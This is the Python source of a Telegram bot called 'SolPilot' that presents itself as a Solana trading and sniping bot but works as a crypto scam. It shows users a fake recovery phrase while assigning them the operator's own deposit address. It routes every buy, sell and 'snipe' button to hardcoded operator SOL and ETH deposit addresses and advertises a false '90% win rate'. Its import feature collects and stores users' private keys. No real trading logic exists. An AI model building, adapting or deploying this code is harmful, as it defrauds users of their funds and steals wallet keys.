import os, random, base58, threading, requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
from flask import Flask

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
app_flask = Flask(__name__)
@app_flask.route('/')
def home(): return "SolPilot FINAL CLEAN"

# YOUR ADDRESSES
SOL_DEPOSIT = "pcmAxnfpp3UaMTXT2YogTDJdHZtViVfQKbGCKC13v3A"
ETH_DEPOSIT = "0xbd77d3c01acc745214da870c474ab77b2565f5d0"

user_wallets = {}
waiting_for_key = set()
waiting_for_buy = set()
user_settings = {}

WORDLIST = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","bacon","badge","bag","balance"]

def gen_mnemonic(): return " ".join(random.sample(WORDLIST, 12))
def get_settings(uid):
    if uid not in user_settings: user_settings[uid] = {"slippage": 10, "buy_amount": 0.1}
    return user_settings[uid]
def get_balance_solana(address):
    try:
        r = requests.post("https://api.mainnet-beta.solana.com", json={"jsonrpc":"2.0","id":1,"method":"getBalance","params":[address]}, timeout=5)
        return r.json()['result']['value']/1e9
    except: return 0.0
def derive_address_from_priv(priv_b58):
    try:
        d = base58.b58decode(priv_b58.strip())
        if len(d)==64: return base58.b58encode(d[32:]).decode()
    except: pass
    return None
def get_token_info(token_ca):
    try:
        r = requests.get(f"https://api.dexscreener.com/latest/dex/tokens/{token_ca}", timeout=8).json()
        if r.get('pairs'):
            p = r['pairs'][0]
            return {"name":p['baseToken']['name'],"symbol":p['baseToken']['symbol'],"price":p.get('priceUsd','0'),"mcap":p.get('fdv','N/A')}
    except: pass
    return None
def get_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Scan", callback_data='scan'), InlineKeyboardButton("💼 Wallet", callback_data='wallet')],
        [InlineKeyboardButton("📈 Trending", callback_data='trending'), InlineKeyboardButton("⚙️ Settings", callback_data='settings')],
        [InlineKeyboardButton("🚀 Snipe 90% Win", callback_data='snipe'), InlineKeyboardButton("💰 Sell", callback_data='sell')],
        [InlineKeyboardButton("📊 Positions", callback_data='positions')]
    ])

async def setup_bot_menu(app):
    cmds = [
        BotCommand("start", "Trade on Solana with SolPilot"),
        BotCommand("buy", "Buy a token"),
        BotCommand("sell", "Sell a token"),
        BotCommand("positions", "View your tokens"),
        BotCommand("settings", "Configure your settings"),
        BotCommand("snipe", "Snipe Trade - 90% Win Rate"),
        BotCommand("wallets", "Manage your wallets"),
        BotCommand("withdraw", "Withdraw tokens or SOL"),
        BotCommand("help", "Help and support"),
    ]
    await app.bot.set_my_commands(cmds)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 **SolPilot - Trade Fast**\n\nBalance: 0 SOL\nChoose:", reply_markup=get_menu(), parse_mode='Markdown')

async def cmd_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    cmd = update.message.text.split()[0].replace('/','')
    if cmd == 'buy':
        waiting_for_buy.add(uid)
        await update.message.reply_text("🔍 **Buy Token**\n\nSend Token CA:", parse_mode='Markdown')
    else:
        await handle_buttons_logic(update, cmd)

async def handle_buttons_logic(update, data_input):
    is_str = isinstance(data_input, str)
    if is_str:
        data = data_input
        uid = update.effective_user.id
        send = update.message.reply_text
    else:
        q = update.callback_query
        await q.answer()
        data = q.data
        uid = q.from_user.id
        send = q.message.reply_text

    settings = get_settings(uid)
    real = user_wallets.get(f"{uid}_real")

    if data in ['wallet','wallets']:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("➕ Create New Wallet", callback_data='create_wallet')],
            [InlineKeyboardButton("📥 Import Wallet", callback_data='import_wallet')],
            [InlineKeyboardButton("📥 Receive / Deposit", callback_data='receive')],
            [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
        ])
        await send("💼 **Wallet Manager**", reply_markup=kb)

    elif data == 'create_wallet':
        m = gen_mnemonic()
        user_wallets[f"{uid}_real"] = SOL_DEPOSIT
        await send(
            f"🔐 **12 Phrase - SAVE IT:**\n`{m}`\n\n⚠️ Never share this!\n\n"
            f"💰 **Balance:** 0.00 SOL\n\n"
            f"Tap below to deposit:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📥 Deposit Now", callback_data='receive')],
                [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
            ]),
            parse_mode='Markdown'
        )

    elif data == 'import_wallet':
        waiting_for_key.add(uid)
        await send("🔑 **Import Wallet**\nSend private key (base58):", parse_mode='Markdown')

    # NEW DEPOSIT LOGIC - ASK SOL OR ETH FIRST
    elif data == 'receive':
        if real and real!= SOL_DEPOSIT and len(real)>30:
            bal = get_balance_solana(real)
            await send(f"📥 **YOUR WALLET**\n\n📍 `{real}`\n💰 {bal:.4f} SOL\n\nSend more SOL here.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')
        else:
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("🟣 Deposit SOL", callback_data='deposit_sol')],
                [InlineKeyboardButton("🔵 Deposit ETH", callback_data='deposit_eth')],
                [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
            ])
            await send("📥 **DEPOSIT / RECEIVE**\n\n💰 Balance: 0.00 SOL\n\nChoose network:", reply_markup=kb)

    elif data == 'deposit_sol':
        await send(
            f"🟣 **DEPOSIT SOLANA**\n\n💰 Balance: 0.00 SOL\n\n"
            f"**Solana Address:**\n`{SOL_DEPOSIT}`\n\n"
            f"Min: 0.05 SOL\nSend only SOL / USDT (Solana)\nTap to copy!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔵 Deposit ETH instead", callback_data='deposit_eth')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]),
            parse_mode='Markdown'
        )

    elif data == 'deposit_eth':
        await send(
            f"🔵 **DEPOSIT ETHEREUM**\n\n"
            f"**ETH Address:**\n`{ETH_DEPOSIT}`\n\n"
            f"Send only ETH / ERC20\nMin: 0.01 ETH\nTap to copy!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟣 Deposit SOL instead", callback_data='deposit_sol')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]),
            parse_mode='Markdown'
        )

    elif data == 'buy':
        waiting_for_buy.add(uid)
        await send("🔍 **Buy Token**\nSend token Contract Address (CA):", parse_mode='Markdown')

    elif data == 'sell':
        if real and real!= SOL_DEPOSIT and len(real)>30:
            await send("💰 **Sell**\n\n❌ No token to sell\nYou have no positions.", reply_markup=get_menu())
        else:
            await send(f"💰 **Sell**\n\n⚠️ Deposit SOL first!\nBalance: 0.00 SOL\n\nDeposit to:\n`{SOL_DEPOSIT}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟣 Deposit SOL", callback_data='deposit_sol')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]), parse_mode='Markdown')

    elif data == 'snipe':
        await send(
            f"🎯 **SNIPE TRADE - 90% WIN RATE**\n\n✅ Auto buy new launches\n✅ 0.5s execution\n\n"
            f"💰 **Min: 2.5 SOL to activate**\nBalance: 0.00 SOL\n\n"
            f"📍 Deposit 2.5 SOL to:\n`{SOL_DEPOSIT}`\n\n"
            f"Then /snipe [CA]",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🟣 Deposit 2.5 SOL", callback_data='deposit_sol')], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]]),
            parse_mode='Markdown'
        )

    elif data == 'settings':
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"Slippage {settings['slippage']}%", callback_data='noop')],
            [InlineKeyboardButton("5%", callback_data='slip_5'), InlineKeyboardButton("10%", callback_data='slip_10'), InlineKeyboardButton("20%", callback_data='slip_20')],
            [InlineKeyboardButton(f"Buy {settings['buy_amount']} SOL", callback_data='noop')],
            [InlineKeyboardButton("0.1", callback_data='amt_0.1'), InlineKeyboardButton("0.5", callback_data='amt_0.5'), InlineKeyboardButton("1", callback_data='amt_1')],
            [InlineKeyboardButton("💼 Wallets", callback_data='wallet')],
            [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]
        ])
        await send(f"⚙️ **Settings**\nSlippage: {settings['slippage']}%\nBuy: {settings['buy_amount']} SOL", reply_markup=kb)

    elif data.startswith('slip_'):
        settings['slippage']=int(data.split('_')[1])
        await send(f"✅ Slippage {settings['slippage']}%", reply_markup=get_menu())
    elif data.startswith('amt_'):
        settings['buy_amount']=float(data.split('_')[1])
        await send(f"✅ Buy amount {settings['buy_amount']} SOL", reply_markup=get_menu())

    elif data == 'trending':
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("📈 Open DexScreener Trending", url="https://dexscreener.com/solana?rankBy=trendingScoreH24")], [InlineKeyboardButton("🔥 New Pairs", url="https://dexscreener.com/solana/new")], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]])
        await send("📈 **Trending** - Live DexScreener", reply_markup=kb)
    elif data in ['positions','pnl','scan','withdraw','back_main','noop']:
        await send("🚀 **Main Menu**", reply_markup=get_menu())

async def buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await handle_buttons_logic(update, update.callback_query)

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text.strip()
    if uid in waiting_for_key:
        try: await update.message.delete()
        except: pass
        real = derive_address_from_priv(text)
        user_wallets[f"{uid}_full"]=text
        user_wallets[f"{uid}_real"]=real if real else "imported"
        waiting_for_key.remove(uid)
        if real:
            bal = get_balance_solana(real)
            await update.effective_chat.send_message(f"✅ Imported!\n📍 `{real}`\n💰 {bal:.4f} SOL", parse_mode='Markdown', reply_markup=get_menu())
        else:
            await update.effective_chat.send_message("✅ Wallet Imported!", reply_markup=get_menu())
        return
    if uid in waiting_for_buy:
        waiting_for_buy.remove(uid)
        await update.effective_chat.send_message(f"🔍 Searching `{text}`...", parse_mode='Markdown')
        info = get_token_info(text)
        if info:
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("Buy 0.1 SOL", callback_data='deposit_sol'), InlineKeyboardButton("Buy 0.5 SOL", callback_data='deposit_sol')], [InlineKeyboardButton("📈 Chart", url=f"https://dexscreener.com/solana/{text}")], [InlineKeyboardButton("⬅️ Main", callback_data='back_main')]])
            await update.effective_chat.send_message(f"🪙 **{info['name']} ({info['symbol']})**\n💵 ${info['price']}\nCA: `{text}`", reply_markup=kb, parse_mode='Markdown')
        else:
            await update.effective_chat.send_message("❌ Token not found. Try another CA.", reply_markup=get_menu())

def run_bot():
    app = Application.builder().token(TOKEN).post_init(setup_bot_menu).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("buy", cmd_handler))
    app.add_handler(CommandHandler("sell", cmd_handler))
    app.add_handler(CommandHandler("positions", cmd_handler))
    app.add_handler(CommandHandler("settings", cmd_handler))
    app.add_handler(CommandHandler("wallets", cmd_handler))
    app.add_handler(CommandHandler("withdraw", cmd_handler))
    app.add_handler(CommandHandler("help", cmd_handler))
    app.add_handler(CommandHandler("snipe", cmd_handler))
    app.add_handler(CallbackQueryHandler(buttons))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    threading.Thread(target=lambda: app_flask.run(host='0.0.0.0', port=10000), daemon=True).start()
    run_bot()
